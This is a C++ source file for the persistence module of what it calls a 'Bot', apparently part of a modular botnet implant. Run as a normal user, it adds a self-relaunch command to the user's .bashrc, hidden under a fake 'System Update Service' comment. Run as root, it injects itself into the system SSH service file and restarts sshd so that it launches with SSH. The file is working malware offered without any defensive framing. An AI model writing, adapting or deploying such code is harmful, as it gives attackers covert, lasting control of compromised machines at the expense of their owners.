#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <unistd.h>
#include <sys/types.h>
#include <fstream>
#include <sstream>
#include <sys/stat.h>

// --- Module Callback Type ---
using module_callback_t = std::function<void(const std::vector<char>&)>;

// --- Persistence Module ---

// --- Helper Functions ---
std::string get_self_path() {
    char buff[1024];
    ssize_t len = readlink("/proc/self/exe", buff, sizeof(buff)-1);
    if (len != -1) {
      buff[len] = '\0';
      return std::string(buff);
    }
    return ""; // Should not happen
}

void send_status(const std::string& msg, module_callback_t& send_output) {
    send_output(std::vector<char>(msg.begin(), msg.end()));
}

// --- User-Level Persistence ---
void persist_user(module_callback_t send_output) {
    const char* home = getenv("HOME");
    if (!home) {
        send_status("[PERSIST] FAILED: Could not get HOME directory.", send_output);
        return;
    }

    std::string self_path = get_self_path();
    if (self_path.empty()) {
        send_status("[PERSIST] FAILED: Could not get own path.", send_output);
        return;
    }

    // Obfuscated command to avoid simple detection
    std::string payload = "if ! pgrep -x $(basename " + self_path + ") > /dev/null; then (nohup " + self_path + " &); fi";
    std::string bashrc_path = std::string(home) + "/.bashrc";
    
    std::ifstream file_in(bashrc_path);
    std::stringstream buffer;
    buffer << file_in.rdbuf();
    std::string file_contents = buffer.str();
    file_in.close();

    if (file_contents.find(payload) == std::string::npos) {
        std::ofstream file_out(bashrc_path, std::ios_base::app);
        file_out << "\n# System Update Service\n" << payload << std::endl;
        file_out.close();
        send_status("[PERSIST] SUCCESS: Injected into " + bashrc_path, send_output);
    } else {
        send_status("[PERSIST] INFO: Payload already exists in " + bashrc_path, send_output);
    }
}

// --- Root-Level Persistence ---
void persist_root(module_callback_t send_output) {
    std::string self_path = get_self_path();
    if (self_path.empty()) {
        send_status("[PERSIST] FAILED: Could not get own path.", send_output);
        return;
    }

    // Target a common, legitimate service file
    std::string service_path = "/lib/systemd/system/ssh.service";
    std::ifstream service_file_in(service_path);
    if (!service_file_in) {
        send_status("[PERSIST] FAILED: Target service file not found: " + service_path, send_output);
        return;
    }

    std::string line;
    std::stringstream new_service_file;
    bool injected = false;
    std::string payload = "ExecStartPost="+self_path;

    while (std::getline(service_file_in, line)) {
        if (line.find(payload) != std::string::npos) {
            send_status("[PERSIST] INFO: Payload already exists in " + service_path, send_output);
            return;
        }
        new_service_file << line << std::endl;
        if (!injected && line.find("[Service]") != std::string::npos) {
            new_service_file << payload << std::endl;
            injected = true;
        }
    }
    service_file_in.close();

    if (!injected) {
        send_status("[PERSIST] FAILED: Could not find [Service] section in " + service_path, send_output);
        return;
    }

    std::ofstream service_file_out(service_path, std::ios::trunc);
    service_file_out << new_service_file.str();
    service_file_out.close();

    // Reload the daemon to apply our changes
    system("systemctl daemon-reload > /dev/null 2>&1");
    system("systemctl restart ssh.service > /dev/null 2>&1");

    send_status("[PERSIST] SUCCESS: Hijacked " + service_path + ". Bot will launch with the SSH service.", send_output);
}


extern "C" void run(const std::vector<char>& data, module_callback_t send_output) {
    send_status("[PERSIST] Analyzing environment...", send_output);
    
    if (geteuid() == 0) {
        send_status("[PERSIST] Root privileges detected. Attempting system-level persistence.", send_output);
        persist_root(send_output);
    } else {
        send_status("[PERSIST] User privileges detected. Attempting user-level persistence.", send_output);
        persist_user(send_output);
    }
}
